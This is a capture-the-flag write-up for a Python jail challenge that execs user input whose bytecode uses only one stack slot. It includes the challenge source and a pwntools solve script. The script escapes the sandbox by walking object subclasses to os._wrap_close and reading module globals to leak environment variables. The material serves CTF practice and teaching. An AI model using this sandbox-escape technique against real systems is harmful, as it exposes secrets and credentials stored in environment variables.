# ImaginaryCTF Round 23 June 2022 Stackless Jail

```python
import dis
del __builtins__.__dict__['breakpoint']
del __builtins__.__dict__['help']

print("Welcome to the python calculator!", "Pls No Steal My Flag Which Is In An Environment Variable :<", sep='\n')

if __name__ == '__main__':
    try:
        math = input('> ')
        info = dis.code_info(math).split("\n")
        assert "Stack size:        1" in info

        exec(math, {}, results := {})
        for var, res in results.items():
            print(f"{var} = {res}")
    except:
        print("smh")

# Server: python 3.8
```

Requirements:

1. Function can only use at most one stack element: use `CALL_FUNCTION` instead of `CALL_METHOD`, i.e. use `B = A.method; C = B()` instead of `A.method()`

Inspired by <https://github.com/jailctf/pyjail-collection/tree/main/chals/stackless-jail> and official writeup at <https://imaginaryctf.org/ArchivedChallenges/30>.

This challange requires us to write some code that reads from the environment variable. However, only one stack element can be used. If we directly run `import os` and `os.environ()`, the opcode is:

```python
$ python3.8
>>> import dis
>>> dis.dis("import os; os.environ()")
  1           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (None)
              4 IMPORT_NAME              0 (os)
              6 STORE_NAME               0 (os)
              8 LOAD_NAME                0 (os)
             10 LOAD_METHOD              1 (environ)
             12 CALL_METHOD              0
             14 POP_TOP
             16 LOAD_CONST               1 (None)
             18 RETURN_VALUE
>>> dis.show_code("import os; os.environ()")
Stack size:        2
```

The opcodes require at least two stack elements, according to <https://docs.python.org/3.8/library/dis.html>:

1. IMPORT_NAME: pop TOS and TOS1, push the module object
2. CALL_METHOD: either self and an unbound method object or NULL and an arbitrary callable are on the stack

However, we can call function if we have the function object at TOS and use `CALL_FUNCTION`:

```
CALL_FUNCTION(argc):

Calls a callable object with positional arguments. argc indicates the number of
positional arguments. The top of the stack contains positional arguments, with
the right-most argument on top. Below the arguments is a callable object to
call. CALL_FUNCTION pops all arguments and the callable object off the stack,
calls the callable object with those arguments, and pushes the return value
returned by the callable object.
```

So to call function, instead of calling it from object directly, we can save it to a variable and call it:

```python
$ python3.8
>>> import dis
>>> dis.dis("p = print; p()")
  1           0 LOAD_NAME                0 (print)
              2 STORE_NAME               1 (p)
              4 LOAD_NAME                1 (p)
              6 CALL_FUNCTION            0
              8 POP_TOP
             10 LOAD_CONST               0 (None)
             12 RETURN_VALUE
>>> dis.show_code("p = print; p()")
Stack size:        1
```

However, we can't pass args to the functions. So we can't use `__import__("os")`. We can use the trick of `()` -> `object` -> `subclasses` -> `os._wrap_close` -> `os` to find it. Every function call must be broken into steps to avoid using excessive stack elements. To access list element, use `arr.pop()` until the entry is poped from the array instead of `arr.[index]`.

Attack:

```python
from pwn import *

context(log_level="debug")

# find index of os._wrap_close
p = process(["python3.8", "stackless-jail.py"])
p.recvuntil(b"> ")
p.sendline(
    (
        "A = ();"
        + "B = A.__class__;"
        + "C = B.__base__;"
        + "D = C.__subclasses__;"
        + "E = D();"
    ).encode()
)
p.recvuntil(b"E =")
res = p.recvline().decode()
length = res.count(", ") + 1
os_wrap_close_index = res.split(", ").index("<class 'os._wrap_close'>")
print(os_wrap_close_index)

# pop until we found os._wrap_close
p = process(["python3.8", "stackless-jail.py"])
p.recvuntil(b"> ")
p.sendline(
    (
        "A = ();"
        + "B = A.__class__;"
        + "C = B.__base__;"
        + "D = C.__subclasses__;"
        + "E = D();"
        + "F = E.pop;"
        + "".join(["F();"] * (length - os_wrap_close_index - 1))
        + "G = F();"  # now G is os._wrap_close
        + "H = G.__init__;"
        + "I = H.__globals__;"
        + "J = I.values;"
        + "K = J();"  # call os._wrap_close.__init__.__globals__.values()
    ).encode()
)
p.recvuntil(b"K =")
# os.environ content is already printed as part of os.environ/os.environb, no need to call os.environ()
```
